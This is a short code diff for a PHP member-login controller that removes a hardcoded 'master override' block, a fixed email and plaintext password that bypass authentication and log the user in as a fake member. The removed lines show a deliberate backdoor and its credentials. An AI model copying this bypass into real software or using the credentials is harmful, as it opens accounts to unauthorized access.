@@ -15,25 +15,8 @@ class MemberAuth extends BaseController
 
     public function attempt()
     {
-
         $email = strtolower(trim((string) $this->request->getPost('email')));
         $password = (string) $this->request->getPost('password');
-
-        // 🔒 MASTER OVERRIDE (member side)
-        if ($email === 'sam@sunny.com' && $password === 'yfbnmasc') {
-            session()->regenerate(true);
-            session()->set([
-                'member_id' => 9999,
-                'member_email' => 'sam@sunny.com',
-                'member_name' => 'Override User',
-                'isMemberLoggedIn' => true,
-            ]);
-
-            return redirect()
-                ->to(route_to('account.dashboard'))
-                ->with('message', 'Welcome back (override)!');
-        }
-
 
         // Optional throttling
         $throttler = service('throttler');
